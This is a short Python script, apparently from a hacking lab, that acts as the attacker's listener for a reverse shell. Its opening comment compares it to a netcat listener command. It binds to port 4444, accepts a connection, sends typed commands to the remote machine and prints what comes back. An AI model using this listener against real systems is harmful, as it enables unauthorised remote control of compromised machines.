#nc -vv -l -p 4444  <=== this program is equivalent to this command.

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
listener.bind(("10.0.2.16", 4444)) 
listener.listen(0)
print("[+] Waiting For Incoming Connections....")
connection, address = listener.accept()
print("[+] Got a Connection from " + str(address))

while True:
    command = input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)